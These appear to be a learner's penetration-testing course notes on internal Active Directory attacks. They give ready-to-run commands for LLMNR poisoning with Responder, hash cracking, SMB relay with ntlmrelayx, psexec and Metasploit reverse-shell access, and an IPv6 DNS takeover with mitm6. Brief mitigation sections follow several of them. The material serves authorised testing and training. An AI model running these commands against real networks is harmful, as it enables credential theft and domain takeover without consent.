# Introduction
Overview of how engagements are performed. Sending a laptop to the client and connecting to it via VPN.
# LLMNR
## LLMNR Poisoning Overview
```bash
# Run responder
sudo responder -I tun0 -dwPv # -I is the interface
```
Wait for an event to happen
Get the hash
User hashcat to crack it
```bash
hashcat -m 5600 hash.txt wordlist.txt -O # Run it on Host system, not VM
hashcat -m 5600 hash.txt wordlist.txt --show #If the hash has already been cracked
hashcat -m 5600 hash.txt wordlist.txt --force #If running the command in a VM and need to force the VM to run hashcat
hashcat -m 5600 hash.txt wordlist.txt -r OneRule # Run it with rules
```
## Capturing Hashes with Responder: Continuation to LLMNR Poisoning
Run responder
As the victim power the VM -> Login -> Open explorer -> Paste in the the explorer address ``\\attacker-ip`` -> Enter
Get the `NTLMv2` hash
## Cracking Our Captured Hashes: Continuation to LLMNR Poisoning
Copy hash into a file. Call it something like `hashes.txt`.
use hashcat or jonh the ripper.
Don't run the command from the virtual machine though, do it from the host. This will ensure that it uses the GPU.
## LLMNR Poisoning Mitigation
Disable LLMNR and NBT-NS through group policies.
If a company can't disable LLMNR and NBT-NS, then require Network Access Control. Require strong user passwords.
# SMB Relay
## SMB Relay Attacks Overview
Instead of cracking hashes, we relay the hashes to machines to potentially gain access.
**Requirements:**
1. SMB signing must be disabled or not enforced on the target. Usually not enabled or not enforced by default.
2. Relayed user credentials must be admin on machine for any real value.
Find hosts without SMB signing.
```bash
nmap --script=smb2-security-mode.nse -p445 ip-range/24
nmap --script=smb2-security-mode.nse -p445 ip-range/24 -Pn # If ping is blocked.
```
Make a targets file with the vulnerable IP addresses
```
ip-1
ip-2
ip-3
```
Change configurations to `responder` at `/etc/responder/Responder.conf` to turn off `SMB = Off` and `HTTP = Off`.
Run responder.
```bash
# Run responder
sudo responder -I tun0 -dwPv # -I is the interface
```
Setup another tool called `ntlmrelayx.py`. This tool is installed if the script `PimpMyKali` was used
```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support # Dumps the SAM hashes.
sudo ntlmrelayx.py -tf targets.txt -smb2support -i # -i allows us to get an interactive shell. Use nc to connect to it. `nc 127.0.0.1 11000`
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami" # Run a command.
```
Wait for an event to occur.
If the hash relayed is one belonging to a local administrator then we will have a win.
The `ntlmrelayx.py` tool should dump the SAM hashes.
## SMB Relay Attacks Defenses
Enable SMB signing on all devices.
Disable NTLM authentication on network.
Account tiering.
Local admin restriction.
# Gaining Shell Access
There a couple way:
Using Metasploit - with a password, with a hash. This is a noisy way.
```bash
msf > search psexec
msf > use exploit/windows/smb/psexec
msf > options
# For password
msf > set rhost ip-here
msf > set smbdomain domain-here
msf > set smbuser user-here
msf > set smbpass password-here 
# For hash
msf > set smbuser local-user
msf > set smbpass LM:NT-hash-here
# The rest if for both methods
msf > set payload windows/x64/meterpreter/reverse_tcp
msf > show targets # it should be set to automatic, if there are issues try other ones
msf > run
msf > background # to send the session to the background and do other things
msf > sessions # view sessions
msf > sessions 1 # Bring sessions to the foreground
```
Using psexec - with a password
```bash
psexec.py marvel.local/fcastle:'Password1'@10.0.0.25
psexec.py MARVEL/fcastle:'Password1'@10.0.0.25
```
Using psexec - with a hash
```bash
psexec.py administrator@10.0.0.25 -hashes LM:NT # LM:NT is the hash
```
Using other tools.
These will work depending on the environment.
They will not work for the lab environment setup for the PNPT.
```bash
wmiexec.py administrator@10.0.0.25 -hashes LM:NT # LM:NT is the hash
smbexec.py administrator@10.0.0.25 -hashes LM:NT # LM:NT is the hash
```
# IPv6 Attacks
## Overview
We will talk about mainly about DNS takeover via IPv6
If the network is using IPv4 but IPv6 is turned on, who's doing DNS for IPv6?
Nobody?
Set an attacker machine that listen for IPv6 traffic.
If the machine pretends to be the IPv6 DNS server it could use LDAP or SMB to get authentication to the DC.
If we get an NTLM hash, we can do NTLM relay via LDAP.
We will use `mitm6` tool.
## IPv6 DNS Takeover via mitm6
### Installation
The tool should have installed when using `PimpMyKali`.
If not, then follow the installation guide in github.
```bash
# In Kali
sudo apt install mitm6
```
### Attack
NOTE: Caution. Only run this command in small sprints (5-10 minutes).
NOTE: Caution. Do not set it up and walk away. This can cause network outages.
Setup `ntlmrelayx`
```bash
# -6 is for IPv6, -t is for target, -wh set fake wpad, -l the name could be anything like lootme
ntlmrelayx.py -6 -t ldaps://domain-controller-address -wh fakewpad.marvel.local -l lootme
```
```bash
sudo mitm6 -d domain-name
sudo mitm6 -d marvel.local
```
Once it runs, we should see IPv6 addresses being assigned.
We wait for an event to occur in the network: a reboot, someone logs in, etc.
Once we see a sign of success, check the folder specified with `-l`.
The tool extracts information into that folder. Inspect the files to become familiar.
Now generate a second event.
Login as `Domain Admin` to one of the user workstations and see the traffic.
The tool will create a new user and password for us to use.
The user will be part of the Enterprise Admins group.
We could now do a DCSync attack with secretsdump.py
## Mitigations
Watch the video. I'm not re-typing that
However, disabling IPv6 is not the solution.
# Passback Attacks
- [https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack)
Printers and IoT devices.
### Story
Printer with default credentials.
Printer with smb share user after scanning a file. Check the setup.
## Overview
Get access to something that connects to LDAP, makes an SMB connection, etc.
Change the server address to make the connection. Replace the DC ip with the attacker IP.
Setup a listener and receive the password/credentials in cleartext.
# Initial Internal Attack Strategy
What we are doing with all these bullet points is Enumeration.
Enumerate, enumerate, enumerate.
- Begin dat with mitm6 or Responder.
   - Use responder first, as mitm6 can only be done in sprints (5-10 minute intervals).
- Run scans to generate traffic.
   - While running responder, run scans to generate traffic.
- If scans are taking too long, look for websites in scope (http_version).
   - Multi task, if responder is not getting any traffic then do something else.
   - msf console has the http_version module. It could be used to swepp the network to see live hosts.
- Look for default credentials on web logins.
   - Printers.
   - Jenkins.
   - Etc.
- Think outside the box.
- If we have been days in the engagement and have not cracked an account, then ask the client to create one.
   - Some clients might agree, others don't.
   - Now test for scenarios for when an account gets compromised.
